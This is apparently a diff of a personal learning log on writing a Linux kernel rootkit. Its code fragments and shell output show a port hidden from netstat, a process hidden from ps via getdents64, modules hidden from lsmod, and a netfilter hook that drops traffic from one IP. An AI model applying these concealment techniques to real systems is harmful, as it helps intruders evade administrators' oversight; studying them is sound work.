@@ -305,7 +305,7 @@ since all that these functions do is print stuff, I feel comfortable messsing th
 inet = inet_sk(sk);
 	srcp = ntohs(inet->inet_sport);
 	if (srcp == 8000){
-		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
+		printk(KERN_INFO "netstat_rootkit: identified tcp listening on port 8000\n");
 		seq_puts(seq, "");
 		return 0;
 	}
@@ -342,32 +342,27 @@ getdents64(5, 0x55dd42415060 /* 387 entries */, 32768) = 9784
 
 but this solution is not very good- getdents64 gets an open fd and uses it, it is not aware of what is the name of the directory it lists. this means that if we filter getdents64 entries by "pid", we might have wierd side-effects of users listing things with the same name as that pid and it will be hidden- not very common but possible.
 
-so I will try to find a more subtle solution, and if it doesn't work I will come back to this.
+anyway, its good enough as POC.
 
 actually, my current solution for hiding from ls works out of the box for hiding procceses with this method too:
 
 ```bash
 _  ls_rootkit git:(main) _ ps aux | grep python
 
-root         800  0.0  0.5  49668 21448 ?        Ss   Jun05   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
-root         948  0.0  0.6 126692 23360 ?        Ssl  Jun05   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+__snipped__
 royco      16334  0.6  0.4  38716 17256 pts/3    S+   01:11   0:00 python3 -m http.server
-royco      16336  0.0  0.0  17864  2372 pts/2    S+   01:11   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python
 
 
 
 _  ls_rootkit git:(main) _ sudo ./insert_rootkit.sh 16334 
 
 _  ls_rootkit git:(main) _ ps aux | grep python          
-root         800  0.0  0.5  49668 21448 ?        Ss   Jun05   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
-root         948  0.0  0.6 126692 23360 ?        Ssl  Jun05   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
-royco      16374  0.0  0.0  17864  2304 pts/2    S+   01:11   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python
-
+__sniped__
 ```
 
 
 
-# blocking traffic by filter
+# level 5
 
 now I need to block traffic by a certain filter. this seems like a big goal so I don't even know where to start. if I want to block by IP then I can sit on the IP stack and block anything layer 3 and above: ping, tcp udp etc. and if I sit higher- tcp for example- I can filter by port but cannot filter non-tcp protocols.
 
@@ -655,4 +650,101 @@ so ```seq_puts(m,"");``` does the job here.
 now I can hide arbitrary kernel modules from commands like lsmod.
 
 
+
+
+
+
+
+# more on level 5
+
+the tcp_rcv function contains this line:
+
+```c
+return NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,
+		       net, NULL, skb, dev, NULL,
+		       ip_rcv_finish);
+```
+
+
+
+as I stated earlier, there are better ways to inspect and drop traffic from kernel, one of which is writing a netfilter hook.
+this allows for a much more generic and "correct" solution which (I assume) is also more runtime-efficient.
+
+I use [this article](https://infosecwriteups.com/linux-kernel-communication-part-1-netfilter-hooks-15c07a5a5c4e) as reference.
+
+this is the function the blog author wrote as a netfilter hook.
+
+**disclaimer** not my code 
+
+```c
+static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+{
+	struct iphdr *iph;
+	struct udphdr *udph;
+	if (!skb)
+		return NF_ACCEPT;
+
+	iph = ip_hdr(skb);
+	if (iph->protocol == IPPROTO_UDP) {
+		udph = udp_hdr(skb);
+		if (ntohs(udph->dest) == 53) {
+			return NF_ACCEPT;
+		}
+	}
+	else if (iph->protocol == IPPROTO_TCP) {
+		return NF_ACCEPT;
+	}
+	
+	return NF_DROP;
+}
+```
+
+in the article he mentions there are 5 types of NF hooks on IPv4 packets:
+
+```
+A Packet Traversing the Netfilter System:
+--->[1]--->[ROUTE]--->[3]--->[4]--->
+                 |            ^
+                 |            |
+                 |         [ROUTE]
+                 v            |
+                [2]          [5]
+                 |            ^
+                 |            |
+                 v            |
+```
+
+so the one I care about here is [1] : pre
+
+
+
+my modified version for blocking specific source ip address:
+
+```c
+
+static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+{
+	struct iphdr *ip_header;
+	unsigned int src_ip;
+	if (!skb)
+		return NF_ACCEPT;
+
+	ip_header = ip_hdr(skb);
+	src_ip = (unsigned int)ip_header->saddr;
+	if (src_ip == 0x01010101)
+	{
+		return NF_DROP;
+	}
+	
+	return NF_ACCEPT;
+}
+```
+
+
+
+looks very much like my other solution for level 5, but this is probably better.
+
+for the moment I will not merge it into my rootkit. it is in a seperate module for now.
+
+now I can add this into my main rootkit.
 
